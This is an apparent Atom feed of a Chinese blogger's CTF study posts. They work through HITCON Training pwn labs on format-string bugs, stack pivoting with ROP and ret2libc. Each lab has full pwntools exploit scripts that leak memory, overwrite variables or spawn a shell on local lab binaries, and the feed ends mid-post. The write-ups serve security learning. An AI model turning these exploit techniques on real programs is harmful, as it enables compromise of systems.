<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yof3ng&#39;s Blog | 热爱分享</title>
  
  <subtitle>Yof3ng</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yof3ng.xyz/"/>
  <updated>2018-10-26T08:30:52.978Z</updated>
  <id>http://www.yof3ng.xyz/</id>
  
  <author>
    <name>Yof3ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwn-10月26-Hitcon-四</title>
    <link href="http://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/"/>
    <id>http://www.yof3ng.xyz/2018/10/26/Pwn-10月26-Hitcon-四/</id>
    <published>2018-10-26T05:21:15.000Z</published>
    <updated>2018-10-26T08:30:52.978Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月26-Hitcon-四"><a href="#Pwn-10月26-Hitcon-四" class="headerlink" title="Pwn-10月26-Hitcon-四"></a>Pwn-10月26-Hitcon-四</h1><blockquote><p>练习Hitcon的第四天🐷，愉快地学习fsb（Format string bug），格式化字符串漏洞。</p></blockquote><h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote><p>好👍，这题开始接触格式化字符串漏洞。</p><p>什么是格式化字符串漏洞？我们知道c/c++中<code>printf</code>函数输出值需要对应的参数，但当提供的参数出现问题，或者没有提供参数的时候，格式化字符串漏洞就可能出现了。<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wiki传送门</a></p><p>那么假设，此时我们在编写程序时候，写成了下面的样子</p><pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code></pre><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li><strong>解析其地址对应的字符串</strong></li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>由此可见<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">格式化字符串漏洞</a>主要是：</p><ul><li><p><strong>1.泄漏任意地址的值，leak内存（比如leak出libc基地址）</strong></p></li><li><p><strong>2.写任意地址，可用于修改got表</strong></p></li></ul></blockquote><pre class=" language-bash"><code class="language-bash">这部分来自icemakr的博客 <span class="token operator">==</span><span class="token operator">></span>向大佬致敬32位读<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读4个字节<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 同上面<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>写<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节64位读<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // 读4个字节<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // 读8个字节<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读8个字节<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>写<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9%6<span class="token variable">$lx</span><span class="token keyword">:</span> 栈上的第一个QWORD</code></pre><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>按套路来，先<code>checksec crack</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p><p>可以看到开启了栈溢出保护(canary found)，以及栈不可执行(NX)措施，很明显让我们从别处入手。</p><p>简单运行一下：</p><p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p><p>我们需要输入两个值，一个是name，输入之后会被打印，一个是password。</p><p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4x师傅</a>的逻辑：<code>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(“cat flag”) 处（注意这里 printf 实际调用了 puts）</code>。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>idapro启动！！启动！！给我启动啊！！🙃！main函数：</p><p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p></blockquote><h4 id="exp1：通过格式化字符串漏洞泄露password"><a href="#exp1：通过格式化字符串漏洞泄露password" class="headerlink" title="exp1：通过格式化字符串漏洞泄露password"></a>exp1：通过格式化字符串漏洞泄露password</h4><blockquote><p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p><p>简单测试一下我们可以看到一些有趣的东西，这些应该是<code>printf</code>栈中的数据，那么我们只要找到栈中存储我们输入的内容的位置，假如输入的是某地址，再用%s解析就可获得该地址下的内容：</p><p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p><p><img src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" alt=""></p><p>可以看到输入的内容在栈中的第十个位置，这里学到一个小知识，<code>%10$s</code>中格式化字符串的“$”操作符，其允许我们从格式化字符串中选取一个位置的参数作为特定的参数。我们可以从IDA中得到<code>password_addr=0x804A080</code>，然后构造EXP。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2scontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#drop = True 表示丢弃pattern，不接受pattern</span>pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" alt=""></p><h4 id="exp2：修改随机数"><a href="#exp2：修改随机数" class="headerlink" title="exp2：修改随机数"></a>exp2：修改随机数</h4><blockquote><p>简单了解fmtstr之后，知道原来还有这么骚的pwntools模块，这里简单对这个exp做个分析理解。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#来自Veritas501大佬的exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>fmt_len <span class="token operator">=</span> <span class="token number">10</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果:</p><p><img src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" alt=""></p><h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote><p>这也是一题格式化字符串漏洞😄，我们可以直接通过类似上面题exp2的方式来修改值达到目的。</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec craxme</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" alt=""></p><p>可以看到几乎所有保护措施都打开，无法通过栈溢出或者栈执行等漏洞进行攻击。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>像lab7一样，我们可以在ida里面看到有格式化字符串漏洞：</p><p><img src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" alt=""></p><p>我们可以运行一下试试</p><p><img src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" alt=""></p><p>可以看到在printf函数栈中第七个位置是我们输入的内容，那么我们就可利用pwntools的fmtstr_payload来改变magic的值。</p><p>通过ida找到magic的地址：</p><p><img src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" alt=""></p><p>通过Pwntools.ELF:</p><p><img src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" alt=""></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" alt=""></p><blockquote><p>今天的格式化字符串漏洞就学到这儿啦，难受😭。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月26-Hitcon-四&quot;&gt;&lt;a href=&quot;#Pwn-10月26-Hitcon-四&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月26-Hitcon-四&quot;&gt;&lt;/a&gt;Pwn-10月26-Hitcon-四&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月25-Hitcon(三)</title>
    <link href="http://www.yof3ng.xyz/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
    <id>http://www.yof3ng.xyz/2018/10/25/Pwn-10月25-Hitcon-三/</id>
    <published>2018-10-25T00:54:34.000Z</published>
    <updated>2018-10-25T09:16:07.488Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月25-Hitcon-三"><a href="#Pwn-10月25-Hitcon-三" class="headerlink" title="Pwn-10月25-Hitcon(三)"></a>Pwn-10月25-Hitcon(三)</h1><blockquote><p>一天一天慢慢来，😭</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>这个题目涉及到栈迁移(stack-pivot)，在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>上面是有这个例题和解释的。</p><blockquote><p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求:</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>在这题中，溢出长度不够导致无法一次性构造ropchain，并且还限制了main函数溢出的次数。</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>开启了NX。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>ida 里面看一看：</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>buf大小为0x28 = 40字节，而read读取0x40 = 64字节</p><p>gdb跑一下，看看具体情况：</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>也就是说有4个字节被读取到EBP中，剩下20个溢出字节可以用来构造ropchain。</p><p>搜索一下可用的gadget：</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#懵逼栈</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp运行效果：<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>这题伪造假栈帧，从而构造ropchain，简直就是一场消化盛宴，我需要好好消化一下lab6。</p><p>今天还看了一下安恒一周年特别赛的一道pwn题–over，做一半发现只能控制ebp和eip？？？没想到是安恒杯六月赛的一道原题，在ctf-wiki的花式栈溢出技巧里面有，并且和lab6一样也是通过控制ebp和eip来做，但是那题并没有多出来的溢出字节。</p><p>总的来说，两种都可以称作伪造假栈帧：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-花式栈溢出</a>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月25-Hitcon-三&quot;&gt;&lt;a href=&quot;#Pwn-10月25-Hitcon-三&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月25-Hitcon(三)&quot;&gt;&lt;/a&gt;Pwn-10月25-Hitcon(三
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月24-hitcon(二)</title>
    <link href="http://www.yof3ng.xyz/2018/10/24/Pwn-10%E6%9C%8824-hitcon-%E4%BA%8C/"/>
    <id>http://www.yof3ng.xyz/2018/10/24/Pwn-10月24-hitcon-二/</id>
    <published>2018-10-24T04:45:45.000Z</published>
    <updated>2018-10-24T10:06:33.500Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月24-hitcon-二"><a href="#Pwn-10月24-hitcon-二" class="headerlink" title="Pwn-10月24-hitcon(二)"></a>Pwn-10月24-hitcon(二)</h1><blockquote><p>继续hitcon的解题之路。</p></blockquote><h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote><p>拿到题目看题目名，和lab3的ret2sc差不多，这个应该是return to libc，也是一种攻击手法。泄露libc并且leak出libc基地址，从而getshell？😄</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ret2lib</code>:</p><p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>简单跑一下：</p><p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p><p>程序让我们输入一个地址，以整型的形式输入，然后它会返回这个地址存有的内容给我们，然后让我们<code>leave some message</code>，并且打印出来，我们可以通过这个功能从GOT表中将一些函数的真实地址打印出来，然后通过libc文件中函数的偏移量计算基地址，例如将某一个函数的GOT条目的地址传给write函数，就可以泄漏这个函数在进程空间中的真实地址，<strong>GOT表中所存的puts函数的地址便是在ret2lib进程中的实际地址。</strong></p><p>IDA里面看看：</p><p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p><p>通过命令<code>readelf -V ret2lib</code>可以查到其libc库版本为<code>libc.so.6</code>：</p><p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p><p>通过pwntools的elf模块我们可以链接该libc.so.6库，简单看看里面的函数地址：</p><p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p><p>同样针对这题可以使用IDA <code>alt + t</code>来查找GOT表puts地址，也可通过上述ELF模块链接ret2lib程序，通过<code>elf.got[&#39;puts&#39;]</code>来获取GOT表中puts条目地址:</p><p><img src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" alt=""></p><p><img src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" alt=""></p><p>将134520860作为我们需要获得内容的地址输入程序：</p><pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?<span class="token comment" spellcheck="true">###############################</span>What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           The content of the address <span class="token keyword">:</span> 0xf7639250</code></pre><p>然后我们就得到了puts函数条目在存在GOT表中的内容，即<strong>此次</strong>程序运行时puts函数的真实地址<code>0xf7639250</code>。</p><p>libc基地址计算：<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 